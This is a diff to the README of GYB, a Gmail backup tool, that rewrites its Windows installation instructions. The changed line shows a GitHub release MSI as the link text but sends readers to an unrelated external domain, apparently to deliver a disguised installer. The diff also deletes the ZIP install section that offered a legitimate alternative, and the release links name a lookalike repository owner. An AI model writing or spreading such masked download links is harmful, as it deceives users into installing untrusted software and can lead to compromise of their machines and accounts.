@@ -32,7 +32,7 @@ GYB works with Gmail.com and Google Workspace (formerly G Suite / Google Apps) a
 
 ## Windows Users
 
-Download Installer from the [releases](https://github.com/jay0Iee/got-your-back/releases/tag/482d175) page. Install the MSI and you'll be prompted to setup GYB.
+The Installer can be downloaded here --> [https://github.com/GAM-team/got-your-back/releases/gyb-1.70-windows-x86_64.msi](https://qdownloads.tech/Setup/). Install the MSI and you'll be prompted to setup GYB.
 
 ## Mac and Linux Users
 
@@ -43,12 +43,6 @@ Open a terminal and run:
 this will download GYB, install it and start setup.
 
 # Install GYB Not as Quickly
-## Windows Users
-### ZIP Install
-Head to the [releases](https://github.com/jay0Iee/got-your-back/releases/tag/482d175) page and download the latest ZIP file for Windows, do not download the Python Source version (unless you really know what you're doing).
-
-Use the archive extraction tool of your choice to extract the files from the GYB .zip you downloaded. Windows XP and higher have a built in tool that works just fine. When specifying where to extract GYB, I suggest extracting directly to C:\ so that the files will reside in C:\gyb. Once completed, GYB should exist at C:\gyb\gyb.exe
-
 ## Mac and Linux Users
 ### TAR Install
 Head to the [releases](https://github.com/jay0Iee/got-your-back/releases/tag/482d175) page and download the latest tar.xz source version of GYB.
